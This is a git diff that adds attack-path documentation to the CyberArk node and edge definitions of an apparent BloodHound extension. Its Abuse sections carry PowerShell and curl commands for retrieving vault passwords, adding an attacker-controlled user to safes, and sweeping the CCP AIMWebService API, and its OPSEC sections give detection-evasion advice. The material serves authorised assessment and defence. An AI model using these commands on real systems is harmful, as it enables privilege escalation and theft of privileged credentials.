@@ -12,7 +12,37 @@
       "description": "A CyberArk PVWA/Vault instance — the top-level container for all CyberArk users, groups, safes, accounts, platforms, and PSM infrastructure collected from a single PVWA. Each instance is namespaced by the 4-character PVWA tag derived from the --pvwa URL.",
       "is_display_kind": true,
       "icon": "building-shield",
-      "color": "#4A7A96"
+      "color": "#4A7A96",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "The instance node is structural and is not itself an attack target. Use it to scope traversals to one vault and to pivot into the high-value objects it contains:\n\n- Follow `CyberArk_InstanceContains` to enumerate the safes, platforms, PSM servers, and connection components of this deployment.\n- From there, chase `CyberArk_HasAccessTo`, `CyberArk_CanGrantAccessTo`, and `CyberArk_CanRetrieveViaCCP` to reach credentials.\n- Compromise of the PVWA host or Vault server itself is a full-environment compromise: the Vault holds every managed credential, and PVWA brokers all interactive access."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Enumeration of the vault's structure via the REST API is generally low-signal, but authenticating to PVWA and listing safes/accounts is recorded in the CyberArk audit trail under the acting user. Direct access to the Vault or PVWA servers is a critical security event that typically triggers incident response."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk PVWA/Vault instance — the top-level container for everything CyberArkHound collected from a single PVWA: users, groups, safes, accounts, platforms, PSM infrastructure, and applications (AppIDs). Each instance is namespaced by the 4-character PVWA tag derived from the `--pvwa` URL, so multiple vaults can coexist in one BloodHound database without colliding. The instance is the environment node for the CyberArk source and the anchor for scoping queries to a single deployment."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/the-privileged-access-security-solution.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_User",
@@ -20,7 +50,37 @@
       "description": "A CyberArk Vault user. May be a local EPV user, a component/service account (CPM, PSM, PVWA), or an LDAP/directory-synced user. Holds safe permissions directly or through group membership.",
       "is_display_kind": true,
       "icon": "user",
-      "color": "#BFD6E3"
+      "color": "#BFD6E3",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "A user is a principal: its reachable credentials are the union of its own and its groups' outgoing edges.\n\n- Follow `CyberArk_HasAccessTo` for accounts whose passwords the user can retrieve, and `CyberArk_CanGrantAccessTo` for safes where the user can add itself (or a controlled account) with retrieve permission.\n- `CyberArk_CanApprove` marks dual-control approval authority — combined with `CyberArk_HasAccessTo` on the same safe it enables self-approval.\n- Directory-synced users (`CyberArk_SyncsToUser`) are reachable from the AD side: compromising the mapped AD principal grants the Vault user's access via LDAP logon.\n- Component users (CPM/PSM/PVWA) are among the most privileged identities in the deployment; treat them as high-value."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Interactive and API logons under a user are recorded in the Vault audit trail; LDAP-backed logons also generate Active Directory authentication events. Repeated failed logons may trip account-lockout policy. Component-user activity that deviates from its normal automated pattern is a strong detection opportunity."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk Vault user. May be a local EPV user, a component/service account (CPM, PSM, PVWA), or an LDAP/directory-synced user. Users hold safe permissions directly or inherit them through `CyberArk_MemberOf` group membership, and directory-synced users are bridged to Active Directory via `CyberArk_SyncsToUser`. Key properties include whether the user is enabled/suspended, a component user, and its authentication source."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-users.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/ldap-integration.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Group",
@@ -28,7 +88,37 @@
       "description": "A CyberArk Vault group. Members inherit all safe permissions and vault authorizations granted to the group. May be a local vault group or a directory-synced group.",
       "is_display_kind": true,
       "icon": "user-group",
-      "color": "#C8DCC0"
+      "color": "#C8DCC0",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "Groups concentrate access: a single membership can confer credential access across many safes.\n\n- Enumerate the group's outgoing `CyberArk_HasAccessTo` / `CyberArk_CanGrantAccessTo` / `CyberArk_CanApprove` edges to see the effective blast radius of membership.\n- Adding a controlled principal via `CyberArk_MemberOf` (or, for a synced group, into the mapped AD group) inherits all of that access — often a stealthier path than modifying safe membership directly.\n- Directory-synced groups are a cross-surface escalation: an AD group edit lands as CyberArk access after the sync interval, with no direct change inside the vault."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Vault group-membership reads via the REST API are generally not audited. Effective access through a group may not appear in safe-membership reports that list the group rather than its members. AD group edits on synced groups generate Windows events (4728/4732/4756) and take effect only after CyberArk's LDAP sync cycle, creating a detectable delay window."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk Vault group. Members — users or nested groups — inherit all safe permissions and vault authorizations granted to the group cumulatively. A group may be local to the vault or synchronized from a directory, in which case `CyberArk_SyncsToGroup` bridges it to an Active Directory group and AD membership changes propagate on the next LDAP sync."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/managing-vault-groups.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-directory-mappings.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Safe",
@@ -36,7 +126,37 @@
       "description": "A CyberArk safe — a logical container holding privileged accounts and their credentials. Safe members hold permissions (use, retrieve, manage) that govern credential access and privilege escalation.",
       "is_display_kind": true,
       "icon": "vault",
-      "color": "#E8D8B3"
+      "color": "#E8D8B3",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "The safe is the unit of access control — most CyberArk attack paths pass through one.\n\n- `CyberArk_Contains` links the safe to its accounts; combine with the principals' `CyberArk_HasAccessTo` edges to map who can reach which credentials.\n- `CyberArk_CanGrantAccessTo` into the safe is a privilege-escalation primitive: a member with manageSafe/manageSafeMembers can add itself with retrieveAccounts and read every account inside.\n- `CyberArk_CanApprove` on the safe governs dual-control; watch for principals that can both request and approve access to the same safe.\n- A safe without a managing CPM often holds stale, unrotated, or manually-managed credentials that may already be known or reused."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Safe membership additions and permission changes are logged in the Vault audit trail and appear immediately in PVWA safe management; SIEM integrations may alert in real time. Reusing an already-present compromised member is quieter than adding a new one. Account enumeration within a safe requires ListAccounts and is audited."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk safe — a logical container holding privileged accounts and their credentials. Safe members hold permissions (use, retrieve, list, manage members, approve) that govern credential access and privilege escalation. The `managingCPM` property names the CPM that rotates the safe's credentials; a blank value (surfaced as the `SAFE_NO_CPM` finding) means the safe's passwords are not being automatically managed."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dv-managing-safes.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/safe-members-add.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Account",
@@ -44,7 +164,37 @@
       "description": "A privileged account stored in a CyberArk safe. Represents a managed credential for a target system, domain user, or local machine account. Principals with safe access can retrieve or use this credential.",
       "is_display_kind": true,
       "icon": "user-secret",
-      "color": "#E7C8C8"
+      "color": "#E7C8C8",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "The account is the credential — retrieving it is usually the objective.\n\n```powershell\n# Requires retrieveAccounts on the containing safe:\nInvoke-RestMethod -Uri \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n    -Method POST -Headers @{Authorization = \"Bearer $token\"} -Body '{}' -ContentType 'application/json'\n```\n\n- Follow `CyberArk_SyncsToADUser` / `CyberArk_CanConnect` to turn a retrieved credential into AD authentication or lateral movement to a specific host.\n- A retrievable account can also be reached indirectly through CCP (`CyberArk_CanRetrieveViaCCP` from an AppID) or through a reconcile hijack (`CyberArk_CanHijackViaReconcile`), each of which bypasses interactive PVWA login.\n- If the account is `managedByPSM` but monitoring or recording is disabled (the `PSM_BREAKOUT_EXPOSURE` finding), a brokered session is an easier target for escape."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Every password retrieval and PSM session start is logged in the Vault audit trail under the requesting user. If the account requires approval, retrieval without an approved request is denied and the request itself is visible to approvers. Subsequent use of the credential in Active Directory generates standard Windows authentication events (4624/4648/4768/4769/4776) that can be correlated with the prior vault retrieval."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A privileged account stored in a CyberArk safe — a managed credential for a target system, domain user, or local machine account. Principals with retrieveAccounts can obtain the plaintext password; principals with useAccounts can launch a PSM-brokered session without ever seeing it. Inferred edges link the account outward: `CyberArk_SyncsToADUser` (the credential belongs to an AD user), `CyberArk_CanConnect` (it authenticates to an AD computer, often as local admin), and `CyberArk_LinkedTo` (logon/reconcile/additional dependencies). Session properties such as `managedByPSM`, `sessionMonitoringEnabled`, and `sessionRecordingEnabled` describe how tightly the account's use is brokered."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-accounts.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Platform",
@@ -52,7 +202,37 @@
       "description": "A CyberArk platform definition governing password policy, connection settings, dual-control requirements, PSM routing, and Master Policy exception flags. All accounts sharing a platform share the same security policy baseline.",
       "is_display_kind": true,
       "icon": "server",
-      "color": "#D4B8D9"
+      "color": "#D4B8D9",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "Platforms are policy, and policy exceptions are the attack surface.\n\n```powershell\n# Inspect a platform for weakened controls:\nInvoke-RestMethod -Uri \"https://<pvwa>/PasswordVault/API/Platforms/<platformId>\" `\n    -Headers @{Authorization = \"Bearer $token\"}\n# Red flags: RequireDualControlPasswordAccessApproval=false, EnforceCheckinCheckoutExclusiveAccess=false\n```\n\n- `CyberArk_UsesPlatform` (from accounts) and `CyberArk_HasConnectionComponent` / `CyberArk_UsesPSMServer` (to session infrastructure) reveal which accounts inherit the platform's policy and how their sessions are brokered.\n- A platform that defines a privileged reconcile account underpins `CyberArk_CanHijackViaReconcile`: anyone able to add accounts on it can coerce the CPM into resetting a target of their choosing.\n- A wildcard AllowedSafes lets an attacker with account-creation rights stage accounts anywhere, broadening reconcile-hijack and CCP reach."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "Reading platform configuration is non-invasive and generally not audited. Platform modifications require Vault Administrator-level privileges and are logged; unexpected reassignment of high-value accounts to a weaker platform is a strong detection signal."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk platform definition governing password policy, connection settings, dual-control requirements, PSM routing, and Master Policy exception flags. All accounts sharing a platform share the same security baseline, so a single platform-level exception weakens every account on it at once. The `allowedSafesIsWildcard` property flags a platform whose AllowedSafes is `.*` (the `PLATFORM_WILDCARD_ALLOWEDSAFES` finding), letting its accounts be created in any safe."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-platforms.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/master-policy.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_PSMServer",
@@ -60,7 +240,37 @@
       "description": "A Privileged Session Manager server that brokers, isolates, and records privileged sessions. Acts as a proxy between requesting users and target systems, holding the managed credential on the user's behalf.",
       "is_display_kind": true,
       "icon": "desktop",
-      "color": "#A8D5BA"
+      "color": "#A8D5BA",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "Compromising a PSM server exposes every session it processes — live, in-flight sessions and stored recordings alike.\n\n- PSM for Windows stores session recordings locally before transfer (default `C:\\ProgramData\\CyberArk\\PSM\\Sessions\\`); PSM for SSH (PSMP) runs on Linux under `/opt/CARKpsmp/` with logs in `/var/opt/CARKpsmp/logs/`.\n- Follow `CyberArk_PSMServerHostedOn` to the underlying host and pivot via its normal Windows/Linux attack surface (RDP, WinRM, SSH).\n- Because PSM authenticates to targets internally, control of the server can yield reuse of the credentials flowing through it and the ability to break out of the brokered session toward the target system."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "PSM servers are high-value, typically hardened and heavily monitored. All brokered sessions are logged with full metadata and content recording, and access to the PSM host is usually restricted to infrastructure administrators — direct access is conspicuous."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A Privileged Session Manager server that brokers, isolates, and records privileged sessions. It acts as a proxy between the requesting user and the target system, holding the managed credential on the user's behalf so the plaintext is never exposed to the client. `CyberArk_UsesPSMServer` / `CyberArk_ManagedByPSM` map which platforms and accounts route through it, and `CyberArk_PSMServerHostedOn` correlates it to the Active Directory computer it runs on."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/psm-manage-recordings.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_ConnectionComponent",
@@ -68,7 +278,37 @@
       "description": "A PSM connection component defining a session protocol (e.g. PSM-RDP, PSM-SSH, PSM-Telnet, PSM-WebApp) available for accounts on a platform. Determines which protocols can be used for PSM-brokered sessions.",
       "is_display_kind": true,
       "icon": "plug",
-      "color": "#B8C9E0"
+      "color": "#B8C9E0",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "Connection components are informational for pathing but reveal capability and target type.\n\n- An enabled RDP component (e.g. PSM-RDP) implies Windows targets and interactive desktop sessions without exposing the password; an SSH component implies Unix/Linux hosts or network devices via PSMP.\n- Combined with `useAccounts` on an account (`CyberArk_HasAccessTo`), the available components dictate how you can connect through PSM:\n\n```powershell\n$body = @{Reason = 'authorized'; ConnectionComponent = 'PSM-RDP'} | ConvertTo-Json\nInvoke-RestMethod -Uri \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n    -Method POST -Headers @{Authorization = \"Bearer $token\"} -Body $body -ContentType 'application/json'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "All connection-component sessions are fully logged and recorded by PSM, with keystroke logging and screen capture depending on platform configuration. The component in use also discloses the target system type to defenders reviewing session records."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A PSM connection component defining a session protocol available for accounts on a platform — e.g. PSM-RDP (Remote Desktop), PSM-SSH (Secure Shell), PSM-Telnet, or PSM-WebApp. `CyberArk_HasConnectionComponent` links a platform to the components it has enabled, which determines the protocols an operator (or attacker) can use when initiating a PSM-brokered session."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/cc-about-connection-components.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/psm-connect.htm>"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_Application",
@@ -76,119 +316,949 @@
       "description": "A CyberArk Application (AppID) used with the Central Credential Provider (CCP / AIMWebService) or Credential Provider (CP) to retrieve credentials from the Vault at runtime. An AppID with weak or missing authentication restrictions (no Allowed Machines, no OS user / path / hash / certificate binding) can be abused to pull any credential it is permitted to read via a single GET request. Tradecraft: Marat Nigmatullin (FalconForce), SO-CON 2026.",
       "is_display_kind": true,
       "icon": "robot",
-      "color": "#F2C879"
+      "color": "#F2C879",
+      "info": {
+        "abuse": {
+          "title": "Abuse & Escalation",
+          "position": 2,
+          "markdown": {
+            "content": "An unrestricted AppID is a credential-retrieval oracle reachable by anyone who can hit the CCP endpoint.\n\n```bash\n# Exact retrieval of one account:\ncurl -s \"https://<CCP>/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safe>&UserName=<user>&Address=<addr>\"\n# RegExp sweep (one match per request):\ncurl -s \"https://<CCP>/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\n# The default AIMWebService AppID usually reads every safe:\ncurl -s \"https://<CCP>/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=admin\"\n```\n\n- Follow `CyberArk_CanRetrieveViaCCP` to see exactly which accounts the AppID can pull; the `CCP_UNRESTRICTED_APP`, `CCP_UNRESTRICTED_RETRIEVAL`, and `CCP_DEFAULT_AIMWEBSERVICE` findings pre-rank the highest-value targets.\n- If the AppID is restricted to Allowed Machines, `CyberArk_CCPAllowedFrom` points at the hosts that satisfy the restriction — landing on one of those hosts is enough when `machineIsOnlyRestriction` is true.\n- CI/CD runners that hold an AppID are a common foothold for reaching the CCP endpoint."
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 3,
+          "markdown": {
+            "content": "CCP retrievals sit outside the interactive PVWA workflow and are not subject to dual-control approval, so a successful pull raises no approval request. Usage is still recorded (Provider logs plus the Vault audit trail under the application identity). Because each request returns at most one match, RegExp sweeps are noisy — responses like \"Too many password objects\" flag over-broad queries. Prefer exact Safe/Object/UserName lookups to stay quiet."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "A CyberArk Application (AppID) used with the Central Credential Provider (CCP / AIMWebService) or Credential Provider (CP) to retrieve credentials from the Vault at runtime via REST. The `isUnrestricted` property flags an AppID with no authentication binding (no Allowed Machines, OS user, path, hash, or certificate) — knowledge of the AppID alone is enough to pull its credentials. `isDefaultCCPApp` flags the out-of-the-box AIMWebService application, which usually has access to every safe. Tradecraft: Marat Nigmatullin (@_mnigma_, FalconForce), \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 4,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm>\n- <https://docs.cyberark.com/credential-providers/latest/en/content/cp%20and%20ascp/application-details.htm>\n- <https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026>"
+          }
+        }
+      }
     }
   ],
   "relationship_kinds": [
     {
       "name": "CyberArk_HasAccessTo",
       "description": "The source user or group is a member of the safe containing the target account with useAccounts and/or retrieveAccounts permission. Primary credential access edge; properties indicate dual-control approval and session monitoring requirements.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nTo retrieve the account password directly (requires retrieveAccounts permission):\n\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"reason\":\"authorized access\"}'\n\nTo initiate a PSM session (requires useAccounts permission):\n\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"reason\":\"authorized access\",\"ConnectionComponent\":\"PSM-SSH\"}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Every password retrieval and PSM session initiation is logged in the CyberArk Vault audit trail under the accessing user's identity. If requiresApproval is true on the edge, submitting an access request creates a visible approval workflow entry that approvers and auditors can see — access without approval will be denied by the Vault. If requiresSessionMonitoring or recordsSessionActivity is true, the session is fully isolated inside PSM: the user never receives the plaintext credential, and keystrokes, screen captures, and commands may be recorded and stored in the session recording vault."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal is a member of the safe containing the target account with one or more account access permissions (useAccounts and/or retrieveAccounts). This is the primary credential access edge in CyberArk. The edge properties provide critical context: requiresApproval indicates whether dual-control enforcement is active (access requires an approval workflow before credentials can be retrieved); requiresSessionMonitoring and recordsSessionActivity indicate whether privileged sessions must be routed through PSM and whether session content is recorded."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dualcontrolworkflow.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nTo retrieve the account password directly (requires retrieveAccounts permission):\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n$body = @{reason = 'authorized access'} | ConvertTo-Json\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\nTo connect to the target system via PSM without seeing the password (requires useAccounts permission):\n\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\nIf requiresApproval is true, first create an access request:\n\n$reqBody = @{AccountId = '<accountId>'; Reason = 'authorized access'; AccessType = 'ImmediateAccess'} | ConvertTo-Json\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/MyRequests\" `\n    -Method POST -Headers $headers -Body $reqBody -ContentType 'application/json'\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CanGrantAccessTo",
       "description": "The source user or group has manageSafe or manageSafeMembers permission on the target safe. Privilege escalation: the principal can add themselves (or a controlled account) with retrieveAccounts to access all accounts in the safe.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nAdd a controlled user to the safe with account retrieval permissions:\n\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Safes/<safeUrlId>/Members\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"MemberName\": \"<attacker-user>\",\n    \"SearchIn\": \"Vault\",\n    \"Permissions\": {\n      \"UseAccounts\": true,\n      \"RetrieveAccounts\": true,\n      \"ListAccounts\": true\n    }\n  }'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "All safe member additions and permission modifications are logged in the CyberArk Vault audit trail. The new membership will immediately appear in PVWA's safe management UI and in periodic access reviews. If SIEM integration is configured, safe membership changes may trigger real-time security alerts. Consider using an existing compromised user that already appears in safe membership rather than adding a new member."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal has manageSafe or manageSafeMembers permission on the target safe. This is a privilege escalation edge: the principal can add new safe members, modify existing member permissions, or remove members. By adding themselves (or a controlled account) to the safe with retrieveAccounts permission, the attacker gains access to all accounts stored in that safe."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/safe-members-add.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dv-managing-safes.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nAdd yourself (or a controlled user) to the safe with full account access permissions:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n$body = @{\n    MemberName  = '<attacker-user>'\n    SearchIn    = 'Vault'\n    Permissions = @{\n        UseAccounts            = $true\n        RetrieveAccounts       = $true\n        ListAccounts           = $true\n        ViewAuditLog           = $false\n        ViewSafeMembers        = $false\n    }\n} | ConvertTo-Json -Depth 5\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members\" `\n    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n\nTo modify an existing member's permissions instead:\n\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes/<safeUrlId>/Members/<memberName>\" `\n    -Method PUT -Headers $headers -Body $body -ContentType 'application/json'\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CanRetrieveViaCCP",
       "description": "The source CyberArk Application (AppID) is a member of the safe containing the target account with useAccounts and/or retrieveAccounts permission, and can retrieve that credential through the Central Credential Provider (CCP / AIMWebService) REST API — typically via a single GET request and without an interactive PVWA login or dual-control approval. Properties flag unrestricted AppIDs and the default AIMWebService application. Tradecraft: Marat Nigmatullin (FalconForce), SO-CON 2026.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nPull the credential from the CCP REST API with curl (the response 'Content' field is the plaintext password):\n\nCCP='https://<CCP_Server>'\n# Exact, single-account retrieval:\ncurl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n# RegExp enumeration (one match per request — iterate to sweep the vault):\ncurl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\ncurl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=som[a-z]username[0-9];Address=hostname[a-z].local\"\n\n# Default AIMWebService AppID — most likely reads every safe:\ncurl -s \"$CCP/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n# If a client certificate is required, supply it:\ncurl -s --cert client.pem --key client.key \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Query=Safe=<safeName>;UserName=<userName>\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "CCP credential requests are served outside the interactive PVWA workflow and are not subject to dual-control approval, so a successful retrieval will not raise an approval request. CCP usage is still recorded (the Provider writes to its local logs and CCP activity can be collected centrally), and credential retrievals appear in the Vault audit trail under the application identity. Because each request returns at most one match, RegExp vault sweeps generate a high volume of requests. Detection (per Nigmatullin, SO-CON 2026) keys on CCP responses such as \"Too many password objects\" or \"The Credential Provider has encountered an error\", which indicate brute-force / over-broad RegExp queries. Prefer Exact queries against known Safe/Object/UserName values to stay quiet; sweeping RegExp queries are noisy. CI/CD runners (GitLab, Azure DevOps, Bitbucket) that hold an AppID are a common foothold for reaching the CCP endpoint."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk Application (AppID) is a member of the safe containing the target account with useAccounts and/or retrieveAccounts permission, and can therefore retrieve that account's credential through the Central Credential Provider (CCP / AIMWebService) REST API — typically with a single GET request and without any interactive PVWA login. The edge properties carry the application's authentication posture: appIsUnrestricted=true means the AppID has no Allowed Machines and no OS user / path / hash / certificate binding, so knowledge of the AppID alone is enough to pull the credential from anywhere that can reach the CCP endpoint. allowedMachines lists the IPs/hosts permitted to use the AppID (if any), and isDefaultCCPApp=true flags the out-of-the-box AIMWebService application, which usually has access to every safe. Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm>\n- <https://docs.cyberark.com/credential-providers/latest/en/content/ccp/the-central%20-credential-provider.htm>\n- <https://docs.cyberark.com/credential-providers/latest/en/content/ccp/api-ccp-usage.htm>\n- <https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
